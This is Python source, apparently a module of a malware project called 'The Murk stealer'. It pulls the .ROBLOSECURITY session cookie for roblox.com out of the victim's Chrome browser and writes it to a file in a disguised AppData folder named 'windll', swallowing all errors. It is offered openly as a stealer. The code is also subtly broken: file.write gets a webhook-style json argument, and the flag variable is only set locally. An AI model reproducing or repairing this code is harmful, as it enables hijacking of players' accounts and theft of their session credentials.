#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from base64 import b64decode
import os

import browser_cookie3, threading

dat = ""

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        try:
            os.makedirs(rf'{pathtofile}\windll\Games\Roblox')
        except:
            pass
        with open(rf"{pathtofile}\windll\Games\Roblox\Roblox_info.txt", "a") as file:
            file.write(json={'username':'dsc.gg/beaminguni', 'content':f'```Cookie provided by Beamers University: {cookie}```'})
            dat = "\n∟🎮Roblox"
    except:
        pass

def roblox(data):
    browsers = [chrome_logger]

    for x in browsers:
        threading.Thread(target=x,).start()
    if dat != "":
        data.append(dat)
        return data
    else:
        return data